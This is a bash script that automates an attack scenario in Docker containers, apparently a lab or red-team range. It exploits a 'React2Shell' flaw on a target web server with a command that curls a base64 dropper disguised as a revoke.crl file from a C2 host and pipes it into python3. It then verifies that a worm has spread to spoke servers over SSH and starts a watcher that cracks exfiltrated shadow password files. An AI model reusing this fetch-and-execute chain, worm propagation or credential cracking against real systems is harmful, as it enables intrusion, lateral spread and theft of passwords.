#!/bin/bash
#
# run_exploit.sh - Exploit execution and verification script
#
# This script executes the attack by:
# 6. Running the initial access exploit
# 7. Verifying infection
#
# Usage: ./run_exploit.sh [options]
#
# Options:
#   --interactive   Run exploit interactively (pause before execution)
#

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m' # No Color

# Flags
INTERACTIVE=0

# Parse arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        --interactive)
            INTERACTIVE=1
            shift
            ;;
        *)
            echo "Unknown option: $1"
            echo "Usage: $0 [--interactive]"
            exit 1
            ;;
    esac
done

# Helper functions
log_info() {
    echo -e "${BLUE}[*]${NC} $1"
}

log_success() {
    echo -e "${GREEN}[+]${NC} $1"
}

log_warn() {
    echo -e "${YELLOW}[!]${NC} $1"
}

log_error() {
    echo -e "${RED}[-]${NC} $1"
}

log_step() {
    echo ""
    echo -e "${BOLD}${CYAN}=== $1 ===${NC}"
    echo ""
}

# Step 6: Run exploit
step6_run_exploit() {
    log_step "Step 6: Running Initial Access Exploit"
    
    # Check if C2 is serving the file
    log_info "Verifying C2 server has dropper..."
    if ! curl -s http://localhost:8080/public/revoke.crl > /dev/null 2>&1; then
        log_error "C2 server is not serving revoke.crl!"
        log_info "Make sure C2 container is running and file is in place"
        log_info "You may need to run ./setup_environment.sh first"
        exit 1
    fi
    
    log_success "C2 server is ready"
    
    # Verify C2 is accessible from pms_server (Docker DNS)
    log_info "Verifying C2 is accessible from pms_server..."
    if docker exec pms_server ping -c 1 -W 2 c2 > /dev/null 2>&1; then
        log_success "C2 is reachable from pms_server via Docker DNS"
    else
        log_warn "C2 ping test failed, but continuing (may still work via HTTP)"
    fi
    
    # Verify SSH key exists on pms_server
    log_info "Verifying SSH key exists on pms_server..."
    if docker exec pms_server test -f /home/node/.ssh/id_rsa; then
        log_success "SSH key found on pms_server"
    else
        log_error "SSH key not found on pms_server! Cannot propagate to spokes."
        log_info "You may need to run ./setup_environment.sh first"
        exit 1
    fi
    
    if [ $INTERACTIVE -eq 1 ]; then
        echo ""
        log_info "Ready to execute exploit. This will:"
        echo "  1. Exploit React2Shell on pms_server"
        echo "  2. Download and execute the worm from C2"
        echo "  3. Worm will propagate to spoke servers"
        echo ""
        read -p "Press Enter to continue, or Ctrl+C to abort..."
    fi
    
    log_info "Executing React2Shell exploit..."
    log_info "Target: http://localhost:3000"
    log_info "Command: Download and execute worm from C2"
    
    cd attacker/iac
    chmod +x exploit-redirect.sh
    
    EXPLOIT_CMD="curl -s http://c2:8080/public/revoke.crl | grep -v '^-----' | base64 -d | python3"
    
    ./exploit-redirect.sh http://localhost:3000 "$EXPLOIT_CMD"
    
    EXPLOIT_RESULT=$?
    
    cd ../..
    
    if [ $EXPLOIT_RESULT -eq 0 ]; then
        log_success "Exploit executed successfully!"
        log_info "Worm should now be running in pms_server memory"
        log_info "It will propagate to spoke servers via SSH"
        
        # Start shadow file watcher for automatic hash cracking
        step6b_start_watcher
    else
        log_error "Exploit may have failed (exit code: $EXPLOIT_RESULT)"
        log_warn "Check the output above for details"
    fi
}

# Step 6b: Start shadow file watcher
step6b_start_watcher() {
    log_info "Starting shadow file watcher for automatic hash cracking..."
    
    WATCHER_SCRIPT="/attacker/credentials/shadow_watcher.sh"
    
    # Check if watcher is already running
    if docker exec attacker pgrep -f "shadow_watcher.sh" > /dev/null 2>&1; then
        log_warn "Shadow file watcher is already running"
        return
    fi
    
    # Make sure script exists and is executable
    if docker exec attacker test -f "$WATCHER_SCRIPT" 2>/dev/null; then
        docker exec attacker chmod +x "$WATCHER_SCRIPT" 2>/dev/null
        
        # Start watcher in background (detached mode)
        # docker exec -d already runs in detached mode, so we just redirect output
        docker exec -d attacker bash -c "cd /attacker/credentials && $WATCHER_SCRIPT > /tmp/watcher.log 2>&1"
        
        # Give it a moment to start
        sleep 3
        
        # Verify it started
        if docker exec attacker pgrep -f "shadow_watcher.sh" > /dev/null 2>&1; then
            log_success "Shadow file watcher started successfully"
            log_info "Watcher will automatically crack shadow files as they are exfiltrated"
            log_info "Monitor watcher: docker exec attacker tail -f /tmp/watcher.log"
            log_info "Check processes: docker exec attacker ps aux | grep shadow_watcher"
        else
            log_warn "Watcher may not have started properly"
            log_info "Check logs: docker exec attacker cat /tmp/watcher.log"
        fi
    else
        log_warn "Watcher script not found: $WATCHER_SCRIPT"
        log_info "Shadow files will need to be cracked manually"
    fi
}

# Step 7: Wait and verify
step7_verify() {
    log_step "Step 7: Verifying Infection"
    
    log_info "Waiting 30 seconds for worm to propagate to spoke servers..."
    log_info "The worm needs time to:"
    log_info "  1. Start executing on pms_server"
    log_info "  2. Discover SSH keys and networks"
    log_info "  3. Scan and infect spoke servers"
    sleep 30
    
    if [ -f "./verify.sh" ]; then
        log_info "Running verification script..."
        chmod +x verify.sh
        ./verify.sh
    else
        log_warn "verify.sh not found, skipping automated verification"
        log_info "You can manually check with:"
        echo "  docker exec local_site_1 ls -la /tmp/worm"
        echo "  docker exec local_site_1 pgrep -f /tmp/worm"
    fi
}

# Main execution
main() {
    echo ""
    echo -e "${BOLD}${CYAN}╔═══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BOLD}${CYAN}║${NC}  ${BOLD}Exploit Execution - Worm Propagation Scenario${NC}          ${BOLD}${CYAN}║${NC}"
    echo -e "${BOLD}${CYAN}╚═══════════════════════════════════════════════════════════╝${NC}"
    echo ""
    
    step6_run_exploit
    step7_verify
    
    echo ""
    log_step "Exploit Execution Complete!"
    echo ""
    log_success "Exploit and verification completed"
    echo ""
    log_info "Useful commands:"
    echo "  docker-compose ps          - Check container status"
    echo "  docker-compose logs        - View logs"
    echo "  docker-compose down        - Stop all containers"
    echo "  ./verify.sh                - Verify infection status again"
    echo "  docker exec -it attacker bash  - Access attacker container"
    echo ""
    log_info "To run exploit again manually:"
    echo "  ./attacker/iac/exploit-redirect.sh http://localhost:3000 \"curl -s http://c2:8080/public/revoke.crl | grep -v '^-----' | base64 -d | python3\""
    echo ""
}

# Run main
main

